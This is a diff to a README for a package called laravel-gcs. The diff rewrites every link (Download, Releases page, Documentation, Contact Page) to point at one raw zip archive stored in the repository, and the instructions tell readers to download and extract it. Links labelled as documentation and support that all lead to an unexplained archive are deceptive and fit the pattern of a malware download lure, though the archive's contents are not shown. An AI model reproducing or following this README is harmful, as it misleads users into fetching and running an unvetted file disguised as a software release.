@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip)](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip)
+[![Download](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip)](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download laravel-gcs, ensure that your computer meets these basic req
 
 To get started with laravel-gcs, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip) to find the latest version of the software.
+1. Visit the [Releases page](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip) to find the latest version of the software.
 2. Locate the most recent version and click on the download link for your operating system (e.g., Windows, macOS, or Linux).
 3. Download the file to your computer. It should be a `.zip` or similar file type.
 4. Once the download finishes, find the file in your downloads folder and extract it.
@@ -52,9 +52,9 @@ Once you have installed laravel-gcs, using it is simple:
 
 If you encounter any issues or have questions, please check the following resources:
 
-- **Documentation:** Visit the [Documentation](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip) for detailed guides on using features.
+- **Documentation:** Visit the [Documentation](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip) for detailed guides on using features.
 - **Community:** Join our community discussions on the GitHub Issues page to ask questions or report bugs.
-- **Support:** You can contact support directly through the [Contact Page](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip) for any urgent matters.
+- **Support:** You can contact support directly through the [Contact Page](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip) for any urgent matters.
 
 ## ⚡ Roadmap
 
@@ -79,4 +79,4 @@ laravel-gcs is licensed under the MIT License. This means you are free to use, m
 
 ## ✅ Conclusion
 
-Thank you for using laravel-gcs! We’re excited to help you manage your files more easily. Don’t forget to check the [Releases page](https://raw.githubusercontent.com/FelipeeMartinez2/laravel-gcs/main/fichu/laravel-gcs.zip) for updates, and we look forward to your feedback.
+Thank you for using laravel-gcs! We’re excited to help you manage your files more easily. Don’t forget to check the [Releases page](https://github.com/FelipeeMartinez2/laravel-gcs/raw/refs/heads/main/fichu/gcs-laravel-3.7.zip) for updates, and we look forward to your feedback.
